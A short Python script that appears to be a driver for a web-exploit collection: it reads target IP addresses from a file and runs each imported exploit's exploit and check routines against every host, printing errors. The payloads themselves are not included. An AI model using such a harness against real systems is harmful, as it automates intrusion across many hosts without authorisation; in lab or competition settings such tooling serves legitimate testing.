from .web1 import web1
from web import file2ip_list

if __name__ == "__main__":

    def run(ip):
        for wp in web1:
            try:
                wp.exploit({"$IP": ip}).check()
            except Exception as e:
                print(e)

    list(map(run, file2ip_list("ip.txt")))
